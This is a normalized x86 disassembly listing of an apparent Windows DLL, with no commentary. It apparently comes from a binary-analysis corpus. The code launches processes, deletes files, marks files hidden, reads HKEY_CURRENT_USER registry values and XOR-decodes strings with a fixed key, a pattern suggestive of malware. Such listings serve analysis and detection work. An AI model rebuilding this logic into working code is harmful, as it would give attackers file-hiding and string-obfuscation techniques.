mov [ esp + 0x78 ] ax
mov [ esp + 0x34 ] eax
mov [ esp + 0x38 ] eax
mov [ esp + 0x3c ] eax
mov [ esp + 0x40 ] eax
push ebx
lea eax [ esp + 0x9c ]
push eax
mov [ esp + 0x50 ] 0x44
mov [ esp + 0x7c ] 0x1
call [ CreateProcessA@IAT ]
test eax eax
je r-xdata
mov cl [ eax ]
inc eax
cmp cl bl
jne r-xdata
sub eax edx
dec eax
cmp eax ebx
jle r-xdata
lea eax [ esp + 0x78 ]
push eax
call [ LoadLibraryA@IAT ]
cmp eax ebx
je r-xdata
mov ecx [ esp + 0x14 ]
push 0xffffffff
push ecx
call [ WaitForInputIdle@IAT ]
jmp r-xdata
cmp [ esp + eax + 0x78 ] 0x2e
je r-xdata
push ebx
push ebx
push eax
push sub_10001010
push ebx
push ebx
call [ esp + 0x28 ]
push 0x3e8
call ebp
lea eax [ esp + eax + 0x79 ]
jmp r-xdata
dec eax
cmp eax ebx
jg r-xdata
push 0x7
push eax
lea eax [ esp + 0x78 ]
push eax
call sub_1000c4b0
lea ecx [ esp + 0x7c ]
push r--data
push ecx
call sub_1000c31a
add esp 0x14
test eax eax
jne r-xdata
sub_10002600
push ecx
mov eax edi
push esi
xor edx edx
lea esi [ eax + 0x1 ]
lea esp [ esp ]
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
sub eax esi
je r-xdata
pop esi
pop ecx
retn
jmp r-xdata
cmp [ edx + edi ] 0x2f
jne r-xdata
mov eax edi
inc edx
lea esi [ eax + 0x1 ]
mov [ edx + edi ] 0x2a
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
sub eax esi
cmp edx eax
jb r-xdata
sub_10002640
mov eax 0x1514
call sub_1001a110
mov eax [ rw-data ]
xor eax esp
mov [ esp + 0x1510 ] eax
mov eax [ esp + 0x151c ]
push ebx
push edi
xor ebx ebx
push 0x3ff
lea ecx [ esp + 0x91d ]
push ebx
push ecx
mov [ esp + 0x18 ] eax
mov [ esp + 0x924 ] bl
call sub_1000ebe0
push 0x3ff
lea edx [ esp + 0x529 ]
push ebx
push edx
mov [ esp + 0x530 ] bl
call sub_1000ebe0
xor eax eax
push 0x7ff
mov [ esp + 0x2d ] eax
mov [ esp + 0x31 ] ax
mov [ esp + 0x33 ] al
lea eax [ esp + 0xd35 ]
push ebx
push eax
mov [ esp + 0xd3c ] bl
call sub_1000ebe0
push 0x3ff
lea ecx [ esp + 0x141 ]
push ebx
push ecx
mov [ esp + 0x148 ] bl
call sub_1000ebe0
push 0x100
push ebx
push esi
call sub_1000ebe0
push 0x8c
lea edx [ esp + 0x558 ]
push rw-data
push edx
mov [ esp + 0x50 ] 0x80
call sub_10013da0
movzx eax [ rw-data ]
movzx ecx [ rw-data ]
movzx edx [ rw-data ]
mov [ esp + 0x58 ] al
movzx eax [ rw-data ]
mov [ esp + 0x59 ] cl
movzx ecx [ rw-data ]
mov [ esp + 0x5a ] dl
movzx edx [ rw-data ]
add esp 0x48
mov [ esp + 0x13 ] al
movzx eax [ rw-data ]
mov [ esp + 0x14 ] cl
movzx ecx [ rw-data ]
push 0x80
mov [ esp + 0x19 ] dl
lea edx [ esp + 0xd1c ]
push rw-data
push edx
mov [ esp + 0x22 ] al
mov [ esp + 0x23 ] cl
call sub_10013da0
push 0x258
lea eax [ esp + 0x928 ]
push rw-data
push eax
call sub_10013da0
lea ecx [ esp + 0x28 ]
push ecx
push 0x8c
lea edx [ esp + 0x538 ]
push edx
lea eax [ esp + 0x93c ]
push 0x258
push eax
call sub_1000b9c0
add esp 0x2c
mov edi eax
cmp edi ebx
je r-xdata
pop edi
or eax 0xffffffff
pop ebx
mov ecx [ esp + 0x1510 ]
xor ecx esp
call sub_1000c176
add esp 0x1514
retn
lea ecx [ esp + 0x8 ]
push ecx
lea edx [ esp + 0xd1c ]
push edx
push 0x1
push edi
call sub_1000bb40
add esp 0x10
test eax eax
jge r-xdata
mov eax [ esp + 0x8 ]
push ebp
push eax
lea ecx [ esp + 0xd20 ]
push ecx
lea edx [ esp + 0x124 ]
push edx
call sub_1000c36c
mov ebp [ esp + 0x18 ]
mov [ esp + ebp + 0x128 ] bl
mov al [ esp + 0x128 ]
add esp 0xc
mov [ rw-data ] al
mov eax 0x1
cmp ebp 0x2
jbe r-xdata
push edi
call sub_1000bb20
add esp 0x4
push edi
call sub_1000bb20
mov edx [ esp + 0x14 ]
mov edi [ esp + 0x1530 ]
push edx
mov eax esi
call sub_10002900
add esp 0x8
cmp [ esp + 0x1524 ] 0x1
pop ebp
jne r-xdata
mov ecx 0x2
push 0x40
push ebx
push rw-data
call sub_1000ebe0
mov ecx [ esp + 0x1524 ]
add esp 0xc
pop edi
pop ebx
xor ecx esp
xor eax eax
call sub_1000c176
add esp 0x1514
retn
push 0xff
lea eax [ esp + 0x1d ]
push ebx
push eax
mov [ esp + 0x24 ] bl
call sub_1000ebe0
mov eax esi
add esp 0xc
lea edx [ eax + 0x1 ]
lea ebx [ ebx ]
mov cl [ esp + ecx + 0x11c ]
mov [ eax + rw-data ] cl
inc eax
lea ecx [ eax + eax ]
cmp ecx ebp
jb r-xdata
mov cl [ eax ]
inc eax
cmp cl bl
jne r-xdata
sub eax edx
mov edi eax
push esi
lea eax [ esp + 0x1c ]
call sub_10002900
lea ecx [ esp + 0x1c ]
push ecx
push r--data
push esi
call sub_1000c36c
add esp 0x10
sub_10002900
push ecx
push ebp
mov ebp [ esp + 0xc ]
test edi edi
jle r-xdata
pop ebp
pop ecx
retn
push ebx
push esi
mov esi eax
add esi 0x2
mov ecx 0x2
mov dl 0x29
lea esp [ esp ]
mov al [ ecx + ebp - 0x1 ]
mov [ esp + 0xd ] al
mov [ esp + 0xd ] 0x0
jmp r-xdata
mov al [ ecx + ebp ]
mov [ esp + 0xc ] al
mov [ esp + 0xc ] 0x0
jmp r-xdata
cmp ecx edi
jle r-xdata
lea eax [ ecx + 0x1 ]
cmp eax edi
jle r-xdata
mov [ esi ] dl
mov eax [ esp + 0xc ]
mov ebx eax
shr ebx 0x12
and ebx 0x3f
movzx ebx [ ebx + rw-data ]
mov [ esi - 0x2 ] bl
mov ebx eax
shr ebx 0xc
and ebx 0x3f
movzx ebx [ ebx + rw-data ]
mov [ esi - 0x1 ] bl
mov ebx eax
shr ebx 0x6
and ebx 0x3f
movzx ebx [ ebx + rw-data ]
and eax 0x3f
cmp ecx edi
mov [ esi ] bl
mov al [ eax + rw-data ]
mov [ esi + 0x1 ] al
jle r-xdata
add ecx 0x3
lea eax [ ecx - 0x2 ]
add esi 0x4
cmp eax edi
jl r-xdata
mov [ esi + 0x1 ] dl
mov bl [ ecx + ebp - 0x2 ]
lea eax [ ecx - 0x1 ]
cmp eax edi
mov [ esp + 0xe ] bl
jle r-xdata
pop esi
pop ebx
sub_100029c0
sub esp 0x88
mov eax [ rw-data ]
xor eax esp
mov [ esp + 0x84 ] eax
push ebx
push ebp
push esi
push edi
push 0x7f
lea eax [ esp + 0x19 ]
mov edi edx
push 0x0
push eax
mov ebx ecx
mov [ esp + 0x1c ] edi
call sub_1000ebe0
mov eax ebx
add esp 0xc
lea edx [ eax + 0x1 ]
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
mov ecx [ r--data ]
sub eax edx
mov edx [ r--data ]
mov ebp eax
mov eax [ r--data ]
mov [ esp + 0x14 ] ecx
mov ecx [ r--data ]
xor esi esi
mov [ esp + 0x18 ] edx
mov [ esp + 0x1c ] eax
mov [ esp + 0x20 ] ecx
test ebp ebp
jle r-xdata
mov [ edi + esi ] 0x0
mov ecx ebx
sub edi ebx
mov [ edi + ecx ] al
inc esi
inc ecx
cmp esi ebp
jl r-xdata
xor al dl
mov eax esi
cdq
mov ebx 0xf
idiv ebx
mov al [ ecx ]
mov dl [ esp + edx + 0x14 ]
cmp al dl
je r-xdata
mov edx [ esp + 0x10 ]
mov [ edx + esi ] 0x0
jmp r-xdata
mov ecx [ esp + 0x94 ]
pop edi
pop esi
pop ebp
pop ebx
xor ecx esp
call sub_1000c176
add esp 0x88
retn
sub_10002a80
sub esp 0x84
mov eax [ rw-data ]
xor eax esp
mov [ esp + 0x80 ] eax
push ebx
push esi
push edi
push 0x7f
lea eax [ esp + 0x11 ]
push 0x0
push eax
mov esi ecx
mov ebx edx
call sub_1000ebe0
mov ecx [ r--data ]
mov edx [ r--data ]
mov eax [ r--data ]
mov [ esp + 0x18 ] ecx
mov ecx [ r--data ]
xor edi edi
add esp 0xc
mov [ esp + 0x10 ] edx
mov [ esp + 0x14 ] eax
mov [ esp + 0x18 ] ecx
cmp [ esp + 0x94 ] edi
jbe r-xdata
mov ecx [ esp + 0x8c ]
pop edi
pop esi
pop ebx
xor ecx esp
call sub_1000c176
add esp 0x84
retn
sub ebx esi
push ebp
mov [ ebx + esi ] cl
inc edi
inc esi
cmp edi [ esp + 0x98 ]
jb r-xdata
xor edx edx
mov ebp 0xf
mov eax edi
div ebp
movzx eax cl
mov dl [ esp + edx + 0x10 ]
movsx ebp dl
cmp eax ebp
je r-xdata
mov cl [ esi ]
test cl cl
je r-xdata
pop ebp
xor cl dl
sub_10002b30
sub esp 0x21c
mov eax [ rw-data ]
xor eax esp
mov [ esp + 0x218 ] eax
mov eax [ esp + 0x220 ]
push esi
push edi
push 0x103
mov esi edx
lea edx [ esp + 0x1d ]
push 0x0
push edx
mov [ esp + 0x20 ] eax
mov [ esp + 0x1c ] ecx
mov [ esp + 0x24 ] 0x0
call sub_1000ebe0
push 0x103
lea eax [ esp + 0x12d ]
push 0x0
push eax
mov [ esp + 0x134 ] 0x0
call sub_1000ebe0
push r--data
push esi
call sub_1000c759
mov edi eax
add esp 0x20
test edi edi
jne r-xdata
push ebp
push 0x2
push 0x0
push edi
call sub_1000d95e
push edi
call sub_1000d62a
mov esi eax
lea ecx [ esi + 0x1 ]
push ecx
call sub_1000cef2
mov ebp eax
add esp 0x14
test ebp ebp
jne r-xdata
pop edi
or eax 0xffffffff
pop esi
mov ecx [ esp + 0x218 ]
xor ecx esp
call sub_1000c176
add esp 0x21c
retn
lea eax [ esi * 4 + 0x400 ]
cmp esi 0x2710
jb r-xdata
push edi
call sub_1000cd16
add esp 0x4
pop ebp
pop edi
or eax 0xffffffff
pop esi
mov ecx [ esp + 0x218 ]
xor ecx esp
call sub_1000c176
add esp 0x21c
retn
mov [ esp + 0x10 ] eax
inc eax
push eax
call sub_1000cef2
add esp 0x4
mov [ esp + 0xc ] eax
test eax eax
jne r-xdata
lea eax [ esi + esi ]
push ebx
push 0x0
push 0x0
push edi
call sub_1000d95e
push edi
push ebp
mov eax esi
call sub_10008120
add esp 0x14
push edi
mov ebx eax
call sub_1000cd16
cmp ebx esi
je r-xdata
push edi
call sub_1000cd16
push ebp
call sub_1000c3e9
add esp 0x8
pop ebp
pop edi
or eax 0xffffffff
pop esi
mov ecx [ esp + 0x218 ]
xor ecx esp
call sub_1000c176
add esp 0x21c
retn
push ebx
mov ebx [ esp + 0x18 ]
push ebp
push ebx
lea esi [ esp + 0x24 ]
call sub_10008170
add esp 0x10
test eax eax
jge r-xdata
push ebp
call sub_1000c3e9
mov edx [ esp + 0x18 ]
push edx
call sub_1000c3e9
add esp 0xc
or eax 0xffffffff
jmp r-xdata
push ebp
call sub_1000c3e9
mov esi [ esp + 0x18 ]
lea eax [ esi + 0x1 ]
push eax
call sub_1000cef2
mov ebx eax
add esp 0x8
test ebx ebx
jne r-xdata
push edi
call sub_1000cd16
push ebp
call sub_1000c3e9
push ebx
call sub_1000c3e9
add esp 0xc
or eax 0xffffffff
jmp r-xdata
mov ecx [ esp + 0x228 ]
pop ebx
pop ebp
pop edi
pop esi
xor ecx esp
call sub_1000c176
add esp 0x21c
retn
push esi
mov esi [ esp + 0x14 ]
mov ecx esi
mov edx ebx
call sub_10002a80
push esi
call sub_1000c3e9
mov edx [ esp + 0x20 ]
push r--data
push edx
call sub_1000c759
mov esi eax
add esp 0x10
test esi esi
jne r-xdata
push edi
call sub_1000cd16
push ebp
call sub_1000c3e9
mov ecx [ esp + 0x18 ]
push ecx
call sub_1000c3e9
add esp 0xc
or eax 0xffffffff
jmp r-xdata
mov ecx [ esp + 0x1c ]
lea edx [ esp + 0x20 ]
call sub_100029c0
push esi
push 0x4
lea eax [ esp + 0x28 ]
push 0x1
push eax
call sub_1000d3d6
mov ebp [ esp + 0x24 ]
push 0xa
lea ecx [ esp + 0x138 ]
push ecx
push ebp
call sub_1000da27
lea ecx [ esp + 0x140 ]
lea edx [ esp + 0x3c ]
call sub_100029c0
push esi
push 0xc
lea edx [ esp + 0x44 ]
push 0x1
push edx
call sub_1000d3d6
push esi
call sub_1000d218
push edi
push ebx
mov eax ebp
call sub_100080c0
push esi
call sub_1000cd16
push ebx
call sub_1000c3e9
add esp 0x40
xor eax eax
push ebx
call sub_1000c3e9
add esp 0x4
or eax 0xffffffff
jmp r-xdata
sub_10002dd0
sub esp 0x110
mov eax [ rw-data ]
xor eax esp
mov [ esp + 0x10c ] eax
push ebp
mov ebp [ esp + 0x118 ]
push edi
push 0x103
lea eax [ esp + 0xd ]
push 0x0
push eax
mov [ esp + 0x14 ] 0x0
call sub_1000ebe0
mov edi [ GetFileAttributesA@IAT ]
add esp 0xc
push esi
call edi
cmp eax 0xffffffff
je r-xdata
mov ecx [ esp + 0x114 ]
pop edi
pop ebp
xor ecx esp
xor eax eax
call sub_1000c176
add esp 0x110
retn
push ebp
call edi
cmp eax 0xffffffff
je r-xdata
push ebx
call [ DeleteFileA@IAT ]
mov ecx r--data
lea edx [ esp + 0x8 ]
call sub_100029c0
lea edi [ esp + 0x8 ]
dec edi
mov edi edi
mov al [ edi + 0x1 ]
inc edi
test al al
jne r-xdata
mov cx [ r--data ]
lea edx [ esp + 0x8 ]
mov [ edi ] cx
push edx
mov ecx ebx
mov edx esi
call sub_10002b30
add esp 0x4
test eax eax
jl r-xdata
mov ecx r--data
lea edx [ esp + 0x8 ]
call sub_100029c0
lea edi [ esp + 0x8 ]
dec edi
lea ebx [ ebx ]
mov al [ edi + 0x1 ]
inc edi
test al al
jne r-xdata
mov ax [ r--data ]
lea ecx [ esp + 0x8 ]
push ecx
mov ecx ebx
mov edx ebp
mov [ edi ] ax
call sub_10002b30
add esp 0x4
test eax eax
jl r-xdata
push ebx
call sub_10007f40
add esp 0x4
mov eax 0x1
pop edi
pop ebp
mov ecx [ esp + 0x10c ]
xor ecx esp
call sub_1000c176
add esp 0x110
retn
sub_10002ef0
sub esp 0x220
mov eax [ rw-data ]
xor eax esp
mov [ esp + 0x21c ] eax
mov eax [ esp + 0x224 ]
push ebx
push ebp
push esi
push edi
push 0x103
mov esi ecx
lea ecx [ esp + 0x1d ]
push 0x0
push ecx
mov ebx edx
mov [ esp + 0x20 ] eax
mov [ esp + 0x24 ] 0x0
call sub_1000ebe0
add esp 0xc
push 0x103
lea edx [ esp + 0x125 ]
push 0x0
push edx
mov [ esp + 0x12c ] 0x0
call sub_1000ebe0
add esp 0xc
push r--data
push esi
call sub_1000c759
mov edi eax
add esp 0x8
test edi edi
je r-xdata
xor eax eax
push edi
push 0x4
lea eax [ esp + 0x20 ]
push 0x1
push eax
call sub_1000ca10
add esp 0x10
cmp eax 0x4
jne r-xdata
push edi
call sub_1000cd16
jmp r-xdata
lea ecx [ esp + 0x18 ]
lea edx [ esp + 0x120 ]
mov [ esp + 0x1c ] 0x0
call sub_100029c0
lea ecx [ esp + 0x120 ]
push ebx
push ecx
call sub_1000c31a
add esp 0x8
push edi
push 0xc
lea edx [ esp + 0x20 ]
push 0x1
push edx
test eax eax
je r-xdata
call sub_1000ca10
add esp 0x10
cmp eax 0xc
jne r-xdata
call sub_1000ca10
add esp 0x10
cmp eax 0xc
jne r-xdata
lea ecx [ esp + 0x18 ]
lea edx [ esp + 0x120 ]
mov [ esp + 0x24 ] 0x0
call sub_100029c0
lea eax [ esp + 0x120 ]
push eax
call sub_1000d698
mov esi eax
lea eax [ esi + esi * 2 ]
add eax eax
add esp 0x4
push eax
mov [ esp + 0x14 ] eax
call sub_1000cef2
mov ebp eax
add esp 0x4
test ebp ebp
je r-xdata
lea ecx [ esp + 0x18 ]
lea edx [ esp + 0x120 ]
mov [ esp + 0x24 ] 0x0
call sub_100029c0
lea eax [ esp + 0x120 ]
push eax
call sub_1000d698
add esp 0x4
push 0x1
push eax
push edi
call sub_1000d95e
add esp 0xc
test eax eax
jne r-xdata
lea ecx [ esi + 0x1 ]
push ecx
call sub_1000cef2
add esp 0x4
mov ebx eax
push edi
test ebx ebx
jne r-xdata
push edi
push 0x4
lea ecx [ esp + 0x20 ]
push 0x1
push ecx
call sub_1000ca10
add esp 0x10
cmp eax 0x4
je r-xdata
push ebp
mov eax esi
call sub_10008120
push esi
mov ecx ebp
mov edx ebx
mov [ esi + ebp ] 0x0
call sub_10002a80
mov edx [ esp + 0x1c ]
add esp 0xc
push edx
push 0x0
push ebp
call sub_1000ebe0
mov eax [ esp + 0x1c ]
add esp 0xc
push esi
push ebx
push ebp
lea esi [ esp + 0x1c ]
mov [ esp + 0x1c ] eax
call sub_100081e0
add esp 0xc
test eax eax
jge r-xdata
call sub_1000cd16
add esp 0x4
push ebp
call sub_1000c3e9
jmp r-xdata
mov ecx [ esp + 0x14 ]
push r--data
push ecx
call sub_1000c759
mov esi eax
add esp 0x8
test esi esi
je r-xdata
push edi
call sub_1000cd16
add esp 0x4
push ebp
call sub_1000c3e9
add esp 0x4
push ebx
call sub_1000c3e9
jmp r-xdata
add esp 0x4
mov eax [ esp + 0x10 ]
push esi
push ebp
call sub_100080c0
push edi
call sub_1000cd16
add esp 0xc
push esi
call sub_1000cd16
add esp 0x4
push ebp
call sub_1000c3e9
add esp 0x4
push ebx
call sub_1000c3e9
mov edx [ esp + 0x18 ]
add esp 0x4
push edx
call sub_10007f40
add esp 0x4
mov eax 0x1
jmp r-xdata
mov ecx [ esp + 0x22c ]
pop edi
pop esi
pop ebp
pop ebx
xor ecx esp
call sub_1000c176
add esp 0x220
retn
sub_10003180
mov eax edi
lea edx [ eax + 0x1 ]
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
sub eax edx
lea ecx [ eax - 0x1 ]
xor eax eax
test ecx ecx
jl r-xdata
mov [ eax + esi ] 0x0
retn
mov dl [ ecx + edi ]
mov [ eax + esi ] dl
inc eax
sub ecx 0x1
jns r-xdata
sub_100031b0
sub esp 0x23c
mov eax [ rw-data ]
xor eax esp
mov [ esp + 0x238 ] eax
push ebp
mov ebp [ esp + 0x244 ]
push esi
push edi
push 0x103
lea eax [ esp + 0x35 ]
push 0x0
push eax
mov esi ecx
mov edi edx
mov [ esp + 0x3c ] 0x0
call sub_1000ebe0
push 0x103
lea ecx [ esp + 0x149 ]
push 0x0
push ecx
mov [ esp + 0x150 ] 0x0
call sub_1000ebe0
xor eax eax
add esp 0x18
mov ecx r--data
lea edx [ esp + 0x20 ]
mov [ esp + 0x20 ] 0x0
mov [ esp + 0x21 ] eax
mov [ esp + 0x25 ] eax
mov [ esp + 0x29 ] eax
mov [ esp + 0x2d ] ax
mov [ esp + 0x2f ] al
call sub_100029c0
lea edx [ esp + 0x10 ]
push edx
call [ GetLocalTime@IAT ]
movzx eax [ esp + 0x1c ]
movzx ecx [ esp + 0x1a ]
movzx edx [ esp + 0x18 ]
push eax
movzx eax [ esp + 0x1a ]
push ecx
movzx ecx [ esp + 0x1a ]
push edx
push eax
push ecx
push edi
push esi
lea edx [ esp + 0x4c ]
push r--data
push edx
call sub_1000c36c
add esp 0x24
cmp ebp 0x15
ja r-xdata
lea edx [ esp + 0x30 ]
push r--data
push edx
call sub_1000c759
mov esi eax
add esp 0x8
test esi esi
je r-xdata
movzx eax [ ebp + lookup_table_10003598 ]
jmp [ eax * 4 + jump_table_10003570 ]
mov ecx [ esp + 0x244 ]
pop edi
pop esi
pop ebp
xor ecx esp
call sub_1000c176
add esp 0x23c
retn
lea eax [ esp + 0x138 ]
push eax
call sub_10004300
add esp 0x4
test eax eax
jne r-xdata
lea edi [ esp + 0x30 ]
dec edi
lea ebx [ ebx ]
lea eax [ esp + 0x30 ]
dec eax
lea eax [ esp + 0x30 ]
dec eax
lea eax [ esp + 0x30 ]
dec eax
lea eax [ esp + 0x30 ]
dec eax
lea eax [ esp + 0x30 ]
dec eax
lea edi [ esp + 0x30 ]
dec edi
lea edi [ esp + 0x30 ]
dec edi
nop
lea edi [ esp + 0x30 ]
dec edi
lea eax [ esp + 0x138 ]
lea edx [ eax + 0x1 ]
mov edi edi
mov ecx [ r--data ]
mov edx [ r--data ]
mov al [ r--data ]
mov [ esp + 0x138 ] ecx
mov [ esp + 0x13c ] edx
mov [ esp + 0x140 ] al
mov al [ edi + 0x1 ]
inc edi
test al al
jne r-xdata
mov cx [ r--data ]
lea eax [ esp + 0x20 ]
mov [ edi ] cx
mov edx eax
mov cl [ eax + 0x1 ]
inc eax
test cl cl
jne r-xdata
mov edx [ r--data ]
mov cl [ r--data ]
mov [ eax ] edx
mov [ eax + 0x4 ] cl
lea eax [ esp + 0x20 ]
mov edx eax
mov cl [ eax + 0x1 ]
inc eax
test cl cl
jne r-xdata
mov edx [ r--data ]
mov cl [ r--data ]
mov [ eax ] edx
mov [ eax + 0x4 ] cl
lea eax [ esp + 0x20 ]
mov edx eax
mov cl [ eax + 0x1 ]
inc eax
test cl cl
jne r-xdata
mov edx [ r--data ]
mov cl [ r--data ]
mov [ eax ] edx
mov [ eax + 0x4 ] cl
lea eax [ esp + 0x20 ]
mov edx eax
mov cl [ eax + 0x1 ]
inc eax
test cl cl
jne r-xdata
mov edx [ r--data ]
mov cl [ r--data ]
mov [ eax ] edx
mov [ eax + 0x4 ] cl
lea eax [ esp + 0x20 ]
mov edx eax
mov cl [ eax + 0x1 ]
inc eax
test cl cl
jne r-xdata
mov dx [ r--data ]
mov cl [ r--data ]
mov [ eax ] dx
mov [ eax + 0x2 ] cl
lea eax [ esp + 0x20 ]
mov edx eax
mov al [ edi + 0x1 ]
inc edi
test al al
jne r-xdata
mov edx [ r--data ]
lea eax [ esp + 0x20 ]
mov [ edi ] edx
mov edx eax
jmp r-xdata
mov al [ edi + 0x1 ]
inc edi
test al al
jne r-xdata
mov eax [ r--data ]
mov [ edi ] eax
lea eax [ esp + 0x20 ]
mov edx eax
mov al [ edi + 0x1 ]
inc edi
test al al
jne r-xdata
mov ecx [ r--data ]
lea eax [ esp + 0x20 ]
mov [ edi ] ecx
mov edx eax
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
push esi
sub eax edx
push eax
lea ecx [ esp + 0x140 ]
push 0x1
push ecx
call sub_1000d3d6
push esi
call sub_1000cd16
add esp 0x14
lea edx [ esp + 0x30 ]
push edx
call [ GetFileAttributesA@IAT ]
or eax 0x2
push eax
lea eax [ esp + 0x34 ]
push eax
call [ SetFileAttributesA@IAT ]
push 0x3e8
call [ Sleep@IAT ]
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
lea edi [ esp + 0x30 ]
sub eax edx
dec edi
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
lea edi [ esp + 0x30 ]
sub eax edx
dec edi
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
lea edi [ esp + 0x30 ]
sub eax edx
dec edi
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
lea edi [ esp + 0x30 ]
sub eax edx
dec edi
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
lea edi [ esp + 0x30 ]
sub eax edx
dec edi
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
lea edi [ esp + 0x30 ]
sub eax edx
dec edi
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
lea edi [ esp + 0x30 ]
sub eax edx
dec edi
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
lea edi [ esp + 0x30 ]
sub eax edx
dec edi
mov cl [ edi + 0x1 ]
inc edi
test cl cl
jne r-xdata
jmp r-xdata
mov cl [ edi + 0x1 ]
inc edi
test cl cl
jne r-xdata
jmp r-xdata
mov cl [ edi + 0x1 ]
inc edi
test cl cl
jne r-xdata
jmp r-xdata
mov cl [ edi + 0x1 ]
inc edi
test cl cl
jne r-xdata
jmp r-xdata
mov cl [ edi + 0x1 ]
inc edi
test cl cl
jne r-xdata
jmp r-xdata
mov cl [ edi + 0x1 ]
inc edi
test cl cl
jne r-xdata
jmp r-xdata
lea edi [ esp + 0x30 ]
sub eax edx
dec edi
mov edi edi
mov cl [ edi + 0x1 ]
inc edi
test cl cl
jne r-xdata
jmp r-xdata
mov cl [ edi + 0x1 ]
inc edi
test cl cl
jne r-xdata
mov ecx eax
shr ecx 0x2
mov esi edx
[ edi ] [ esi ]
mov ecx eax
and ecx 0x3
[ edi ] [ esi ]
mov cl [ edi + 0x1 ]
inc edi
test cl cl
jne r-xdata
jmp r-xdata
sub_100035b0
sub esp 0x71c
mov eax [ rw-data ]
xor eax esp
mov [ esp + 0x718 ] eax
push ebx
push ebp
mov ebp [ esp + 0x728 ]
xor ebx ebx
push 0x103
lea eax [ esp + 0x11d ]
push ebx
push eax
mov [ esp + 0x124 ] bl
call sub_1000ebe0
push 0x103
lea ecx [ esp + 0x22d ]
push ebx
push ecx
mov [ esp + 0x234 ] bl
call sub_1000ebe0
push 0x3ff
lea edx [ esp + 0x33d ]
push ebx
push edx
mov [ esp + 0x344 ] bl
call sub_1000ebe0
add esp 0x24
cmp ebp ebx
je r-xdata
pop ebp
xor eax eax
pop ebx
mov ecx [ esp + 0x718 ]
xor ecx esp
call sub_1000c176
add esp 0x71c
retn
mov eax ebp
lea edx [ eax + 0x1 ]
lea esp [ esp ]
mov cl [ eax ]
inc eax
cmp cl bl
jne r-xdata
sub eax edx
je r-xdata
push 0x103
lea eax [ esp + 0x19 ]
push ebx
push eax
mov [ esp + 0x20 ] bl
call sub_1000ebe0
push 0x20
push ebp
call sub_1000cfd0
add esp 0x14
test eax eax
je r-xdata
push esi
push edi
mov ecx r--data
lea edx [ esp + 0x120 ]
call sub_100029c0
mov ecx r--data
lea edx [ esp + 0x224 ]
call sub_100029c0
lea edx [ esp + 0x14 ]
push edx
push 0x20019
push ebx
lea eax [ esp + 0x12c ]
push eax
push 0x80000001
call [ RegOpenKeyExA@IAT ]
test eax eax
jne r-xdata
push 0x104
lea ecx [ esp + 0x18 ]
push ecx
push ebp
call [ GetShortPathNameA@IAT ]
test eax eax
ja r-xdata
lea eax [ esp + 0x1c ]
lea edx [ eax + 0x1 ]
lea ecx [ esp + 0x18 ]
push ecx
lea edx [ esp + 0x32c ]
push edx
mov edx [ esp + 0x1c ]
lea eax [ esp + 0x18 ]
push eax
push ebx
lea ecx [ esp + 0x234 ]
push ecx
push edx
mov [ esp + 0x28 ] 0x1
mov [ esp + 0x30 ] 0x400
call [ RegQueryValueExA@IAT ]
mov esi eax
mov eax [ esp + 0x14 ]
push eax
call [ RegCloseKey@IAT ]
xor eax eax
cmp esi ebx
sete al
cmp eax ebx
je r-xdata
mov cl [ eax ]
inc eax
cmp cl bl
jne r-xdata
sub eax edx
mov edi 0x80000001
je r-xdata
lea eax [ esp + 0x328 ]
lea edx [ eax + 0x1 ]
lea ecx [ esp + 0x224 ]
push ecx
mov ebx ebp
lea eax [ esp + 0x224 ]
push eax
lea ebx [ esp + 0x20 ]
jmp r-xdata
mov cl [ eax ]
inc eax
cmp cl bl
jne r-xdata
sub eax edx
je r-xdata
lea eax [ esp + 0x124 ]
call sub_10008720
mov ecx [ esp + 0x72c ]
add esp 0x4
pop edi
pop esi
pop ebp
pop ebx
xor ecx esp
call sub_1000c176
add esp 0x71c
retn
lea eax [ esp + 0x1c ]
lea edx [ eax + 0x1 ]
jmp r-xdata
lea eax [ esp + 0x328 ]
lea edx [ eax + 0x1 ]
mov cl [ eax ]
inc eax
cmp cl bl
jne r-xdata
mov cl [ eax ]
inc eax
cmp cl bl
jne r-xdata
sub eax edx
cmp [ esp + eax + 0x327 ] 0x2c
je r-xdata
sub eax edx
je r-xdata
lea edi [ esp + 0x328 ]
dec edi
mov eax ebp
mov edx ebp
lea eax [ esp + 0x1c ]
mov edx eax
mov al [ edi + 0x1 ]
inc edi
cmp al bl
jne r-xdata
mov cx [ r--data ]
mov [ edi ] cx
mov cl [ eax ]
inc eax
cmp cl bl
jne r-xdata
lea edi [ esp + 0x328 ]
sub eax edx
dec edi
mov cl [ eax ]
inc eax
cmp cl bl
jne r-xdata
lea edi [ esp + 0x328 ]
sub eax edx
dec edi
mov cl [ edi + 0x1 ]
inc edi
cmp cl bl
jne r-xdata
mov ecx eax
shr ecx 0x2
mov esi edx
[ edi ] [ esi ]
mov ecx eax
and ecx 0x3
lea edx [ esp + 0x224 ]
[ edi ] [ esi ]
push edx
lea ebx [ esp + 0x32c ]
mov edi 0x80000001
jmp r-xdata
mov cl [ edi + 0x1 ]
inc edi
cmp cl bl
jne r-xdata
jmp r-xdata
sub_10003850
sub esp 0x71c
mov eax [ rw-data ]
xor eax esp
mov [ esp + 0x718 ] eax
push ebx
xor ebx ebx
push 0x103
lea eax [ esp + 0x21d ]
push ebx
push eax
mov [ esp + 0x224 ] bl
call sub_1000ebe0
push 0x103
lea ecx [ esp + 0x125 ]
push ebx
push ecx
mov [ esp + 0x12c ] bl
call sub_1000ebe0
push 0x3ff
lea edx [ esp + 0x339 ]
push ebx
push edx
mov [ esp + 0x340 ] bl
call sub_1000ebe0
add esp 0x24
cmp edi ebx
je r-xdata
mov ecx [ esp + 0x71c ]
pop ebx
xor ecx esp
xor eax eax
call sub_1000c176
add esp 0x71c
retn
mov eax edi
lea edx [ eax + 0x1 ]
mov cl [ eax ]
inc eax
cmp cl bl
jne r-xdata
sub eax edx
je r-xdata
